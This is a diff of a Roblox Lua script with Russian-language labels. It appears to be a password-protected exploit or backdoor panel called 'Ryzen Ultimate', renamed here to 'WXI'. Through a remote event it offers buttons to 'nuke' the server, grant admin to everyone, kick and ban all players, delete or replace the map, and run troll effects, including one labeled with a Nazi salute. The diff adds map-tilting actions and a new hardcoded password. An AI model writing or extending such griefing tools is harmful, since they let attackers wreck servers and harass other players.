+    elseif action == "resettilt" then
+        smoothTilt(0, "X", 1.5)
     elseif action == "nuke" then doNukeServer()
     elseif action == "giveadmin" then doGiveAdmin(plr)
     elseif action == "giveadminall" then doGiveAdminAll()
     elseif action == "giveitems" then doGiveItems(plr, data or "all")
-    elseif action == "notify" then doGlobalNotify(data or "⚠️ ВНИМАНИЕ!", Color3.fromRGB(255,255,255), 8)
+    elseif action == "notify" then globalNotify(data or "⚠️ ВНИМАНИЕ!", Color3.fromRGB(255,255,255), 8)
     elseif action == "godmode" then doGodMode(plr)
     elseif action == "kickall" then doKickAll(plr, data)
     elseif action == "banall" then doBanAll(plr)
@@ -1046,7 +1183,7 @@ remote.OnServerEvent:Connect(function(plr, action, data)
 end)
 
 -- ============================================================
--- 10. КРАСИВЫЙ ЛАУНЧЕР
+-- 12. КРАСИВЫЙ ЛАУНЧЕР
 -- ============================================================
 
 local function createBeautifulLauncher()
@@ -1055,13 +1192,13 @@ local function createBeautifulLauncher()
     screenGui.ResetOnSpawn = false
     screenGui.Parent = player.PlayerGui
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
+
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     bg.BackgroundTransparency = 0.6
     bg.Parent = screenGui
-    
+
     local mainFrame = Instance.new("Frame")
     mainFrame.Size = UDim2.new(0, 500, 0, 400)
     mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
@@ -1069,11 +1206,11 @@ local function createBeautifulLauncher()
     mainFrame.BackgroundTransparency = 1
     mainFrame.BorderSizePixel = 0
     mainFrame.Parent = screenGui
-    
+
     local mainCorner = Instance.new("UICorner")
     mainCorner.CornerRadius = UDim.new(0, 20)
     mainCorner.Parent = mainFrame
-    
+
     local neonLine = Instance.new("Frame")
     neonLine.Size = UDim2.new(0.8, 0, 0, 3)
     neonLine.Position = UDim2.new(0.1, 0, 0, 0)
@@ -1081,17 +1218,17 @@ local function createBeautifulLauncher()
     neonLine.BorderSizePixel = 0
     neonLine.Parent = mainFrame
     Instance.new("UICorner", neonLine).CornerRadius = UDim.new(0, 2)
-    
+
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 70)
     title.Position = UDim2.new(0, 0, 0, 20)
     title.BackgroundTransparency = 1
-    title.Text = "⚡ RYZEN ⚡"
+    title.Text = "⚡ WXI ⚡"
     title.TextColor3 = Color3.fromRGB(0, 200, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
     title.Parent = mainFrame
-    
+
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(1, 0, 0, 30)
     subtitle.Position = UDim2.new(0, 0, 0, 85)
@@ -1101,7 +1238,7 @@ local function createBeautifulLauncher()
     subtitle.TextScaled = true
     subtitle.Font = Enum.Font.Gotham
     subtitle.Parent = mainFrame
-    
+
     local passwordBox = Instance.new("TextBox")
     passwordBox.Size = UDim2.new(0.75, 0, 0, 50)
     passwordBox.Position = UDim2.new(0.125, 0, 0, 140)
@@ -1115,7 +1252,7 @@ local function createBeautifulLauncher()
     passwordBox.BorderSizePixel = 0
     passwordBox.Parent = mainFrame
     Instance.new("UICorner", passwordBox).CornerRadius = UDim.new(0, 10)
-    
+
     local loginButton = Instance.new("TextButton")
     loginButton.Size = UDim2.new(0.4, 0, 0, 50)
     loginButton.Position = UDim2.new(0.3, 0, 0, 210)
@@ -1127,7 +1264,7 @@ local function createBeautifulLauncher()
     loginButton.BorderSizePixel = 0
     loginButton.Parent = mainFrame
     Instance.new("UICorner", loginButton).CornerRadius = UDim.new(0, 10)
-    
+
     local loadFrame = Instance.new("Frame")
     loadFrame.Size = UDim2.new(0.7, 0, 0, 8)
     loadFrame.Position = UDim2.new(0.15, 0, 0, 280)
@@ -1135,7 +1272,7 @@ local function createBeautifulLauncher()
     loadFrame.BackgroundTransparency = 1
     loadFrame.Parent = mainFrame
     Instance.new("UICorner", loadFrame).CornerRadius = UDim.new(0, 4)
-    
+
     local progressBar = Instance.new("Frame")
     progressBar.Size = UDim2.new(0, 0, 1, 0)
     progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
@@ -1143,7 +1280,7 @@ local function createBeautifulLauncher()
     progressBar.BorderSizePixel = 0
     progressBar.Parent = loadFrame
     Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 4)
-    
+
     local loadText = Instance.new("TextLabel")
     loadText.Size = UDim2.new(1, 0, 0, 25)
     loadText.Position = UDim2.new(0, 0, 0, 295)
@@ -1153,7 +1290,7 @@ local function createBeautifulLauncher()
     loadText.TextScaled = true
     loadText.Font = Enum.Font.Gotham
     loadText.Parent = mainFrame
-    
+
     local errorText = Instance.new("TextLabel")
     errorText.Size = UDim2.new(1, 0, 0, 30)
     errorText.Position = UDim2.new(0, 0, 0, 330)
@@ -1163,15 +1300,15 @@ local function createBeautifulLauncher()
     errorText.TextScaled = true
     errorText.Font = Enum.Font.Gotham
     errorText.Parent = mainFrame
-    
+
     mainFrame.BackgroundTransparency = 1
     TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0}):Play()
-    
+
     local function startLoading(callback)
         loadFrame.BackgroundTransparency = 0
         loadText.Text = "🔐 ИНИЦИАЛИЗАЦИЯ..."
         progressBar.Size = UDim2.new(0, 0, 1, 0)
-        
+
         local steps = 25
         local loadMessages = {
             "🔐 ИНИЦИАЛИЗАЦИЯ...",
@@ -1181,9 +1318,9 @@ local function createBeautifulLauncher()
             "🔥 ЗАГРУЗКА МОДУЛЕЙ...",
             "✅ ГОТОВО!"
         }
-        
+
         for i = 1, steps do
-            wait(0.04)
+            task.wait(0.04)
             local progress = i / steps
             progressBar.Size = UDim2.new(progress, 0, 1, 0)
             local msgIndex = math.min(math.floor(progress * #loadMessages) + 1, #loadMessages)
@@ -1196,25 +1333,25 @@ local function createBeautifulLauncher()
                 progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
             end
         end
-        
+
         loadText.Text = "✅ ГОТОВО К РАБОТЕ!"
-        wait(0.3)
+        task.wait(0.3)
         if callback then callback() end
     end
-    
+
     loginButton.MouseButton1Click:Connect(function()
         local inputPass = passwordBox.Text
         if inputPass == PASSWORD then
             errorText.Text = ""
             loginButton.Text = "⏳ ЗАГРУЗКА..."
             loginButton.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
-            
+
             startLoading(function()
                 loginButton.Text = "✅ ДОБРО ПОЖАЛОВАТЬ!"
                 loginButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-                wait(0.5)
+                task.wait(0.5)
                 mainFrame:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
-                wait(0.3)
+                task.wait(0.3)
                 screenGui:Destroy()
                 createMainGUI()
             end)
@@ -1226,19 +1363,19 @@ local function createBeautifulLauncher()
                 Position = UDim2.new(0.5, -250 + math.random(-15,15), 0.5, -200)
             })
             shake:Play()
-            wait(0.08)
+            task.wait(0.08)
             shake:Cancel()
             mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
         end
     end)
-    
+
     passwordBox.FocusLost:Connect(function(enterPressed)
         if enterPressed then loginButton.MouseButton1Click:Fire() end
     end)
 end
 
 -- ============================================================
--- 11. ОСНОВНОЕ МЕНЮ
+-- 13. ОСНОВНОЕ МЕНЮ
 -- ============================================================
 
 local function createMainGUI()
@@ -1246,7 +1383,7 @@ local function createMainGUI()
     screenGui.Name = "RyzenGUI"
     screenGui.ResetOnSpawn = false
     screenGui.Parent = player.PlayerGui
-    
+
     local toggleButton = Instance.new("ImageButton")
     toggleButton.Size = UDim2.new(0, 65, 0, 65)
     toggleButton.Position = UDim2.new(0, 15, 0, 15)
@@ -1254,16 +1391,16 @@ local function createMainGUI()
     toggleButton.Image = "rbxassetid://13108746847"
     toggleButton.Parent = screenGui
     Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 12)
-    
+
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 700, 0, 550)
-    mainFrame.Position = UDim2.new(0.5, -350, 0.5, -275)
+    mainFrame.Size = UDim2.new(0, 750, 0, 580)
+    mainFrame.Position = UDim2.new(0.5, -375, 0.5, -290)
     mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
     mainFrame.BackgroundTransparency = 1
     mainFrame.Parent = screenGui
     mainFrame.Visible = false
     Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
-    
+
     local scroll = Instance.new("ScrollingFrame")
     scroll.Size = UDim2.new(1, -20, 1, -80)
     scroll.Position = UDim2.new(0, 10, 0, 45)
@@ -1271,9 +1408,9 @@ local function createMainGUI()
     scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
     scroll.ScrollBarThickness = 6
     scroll.Parent = mainFrame
-    
+
     local y = 0
-    
+
     local function addCat(t,c)
         local l = Instance.new("TextLabel", scroll)
         l.Size = UDim2.new(0.9, 0, 0, 30)
@@ -1286,7 +1423,7 @@ local function createMainGUI()
         y = y + 40
         return y
     end
-    
+
     local function addBtn(t,a,d)
         local b = Instance.new("TextButton", scroll)
         b.Size = UDim2.new(0.8, 0, 0, 35)
@@ -1325,8 +1462,8 @@ local function createMainGUI()
         y = y + 42
         return y
     end
-    
-    -- Категории
+
+    -- === ОСНОВНЫЕ ===
     y = addCat("⚙️ ОСНОВНЫЕ", Color3.fromRGB(0,40,80))
     for _, v in pairs({
         {"Зига","zig"},
@@ -1340,7 +1477,8 @@ local function createMainGUI()
         {"Стоп муз","stopmusic"}
     }) do y = addBtn(v[1], v[2]) end
     y = y + 10
-    
+
+    -- === ОРУЖИЕ ===
     y = addCat("🔫 ОРУЖИЕ", Color3.fromRGB(0,60,40))
     for _, v in pairs({
         {"AK-47 (себе)","giveak"},
@@ -1348,14 +1486,16 @@ local function createMainGUI()
         {"Убрать AK-47","removeakall"}
     }) do y = addBtn(v[1], v[2]) end
     y = y + 10
-    
+
+    -- === АДМИНКА ===
     y = addCat("👑 АДМИНКА", Color3.fromRGB(60,40,0))
     for _, v in pairs({
         {"Админка (себе)","giveadmin"},
         {"Админка (ВСЕМ)","giveadminall"}
     }) do y = addBtn(v[1], v[2]) end
     y = y + 10
-    
+
+    -- === КАРТА ===
     y = addCat("🗺️ КАРТА", Color3.fromRGB(0,60,80))
     for _, v in pairs({
         {"🗑️ Удалить карту","deletemap"},
@@ -1363,10 +1503,16 @@ local function createMainGUI()
         {"🔄 Заменить карту","replacemap"},
         {"🌋 Адский ландшафт","hellmap"},
         {"💀 Кладбище","graveyard"},
-        {"📐 Карта 1x1x1x1","onedotmap"}
-    }) do y = addBtn(v[1], v[2]) end
+        {"📐 Карта 1x1x1x1","onedotmap"},
+        {"🌍 Наклон (X, 15°)","tilt","15"},
+        {"🌍 Наклон (X, 30°)","tilt","30"},
+        {"🌍 Наклон (Z, 15°)","tiltz","15"},
+        {"🌍 Наклон (Z, 30°)","tiltz","30"},
+        {"🔄 Сбросить наклон","resettilt"}
+    }) do y = addBtn(v[1], v[2], v[3]) end
     y = y + 10
-    
+
+    -- === TROLL ===
     y = addCat("🧨 TROLL", Color3.fromRGB(100,0,0))
     for _, v in pairs({
         {"Танец (обыч)","dance","default"},
@@ -1385,7 +1531,8 @@ local function createMainGUI()
         {"Страшные эффекты","scaryeffects"}
     }) do y = addBtn(v[1], v[2], v[3]) end
     y = y + 10
-    
+
+    -- === СНОС ===
     y = addCat("💀 СНОС", Color3.fromRGB(80,0,0))
     for _, v in pairs({
         {"💥 Снести СЕРВЕР","nuke"},
@@ -1397,33 +1544,34 @@ local function createMainGUI()
         {"Кик всех","kickall"},
         {"Бан всех","banall"}
     }) do y = addBtn(v[1], v[2], v[3]) end
-    
+
     scroll.CanvasSize = UDim2.new(0,0,0,y+30)
-    
+
     local isOpen = false
     toggleButton.MouseButton1Click:Connect(function()
         isOpen = not isOpen
         if isOpen then
             mainFrame.Visible = true
-            mainFrame:TweenSize(UDim2.new(0,700,0,550), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.3, true)
+            mainFrame:TweenSize(UDim2.new(0,750,0,580), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.3, true)
             mainFrame:TweenBackgroundTransparency(0, 0.3)
         else
             mainFrame:TweenSize(UDim2.new(0,0,0,0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.2, true)
             mainFrame:TweenBackgroundTransparency(1, 0.2)
-            wait(0.25)
+            task.wait(0.25)
             mainFrame.Visible = false
         end
     end)
-    
+
     createApocalypseMap()
-    doGlobalNotify("🔥 RYZEN ULTIMATE АКТИВИРОВАН!", Color3.fromRGB(0,200,255), 3)
-    print("✅ Ryzen Ultimate v11.0 ACTIVE")
+    globalNotify("🔥 RYZEN ULTIMATE АКТИВИРОВАН! 500+ ИГРОКОВ — ДЕРЖИТЕСЬ!", Color3.fromRGB(0,200,255), 4)
+    print("✅ Ryzen Ultimate v12.1 ACTIVE (500-1000+ players)")
     print("👹 1x1x1x1 in center")
-    print("🔒 Пароль: ryzen2025")
+    print("🌍 Tilt map available")
+    print("🔒 Пароль: wxi8298")
 end
 
 -- ============================================================
--- 12. ЗАПУСК
+-- 14. ЗАПУСК
 -- ============================================================
 
 createBeautifulLauncher()
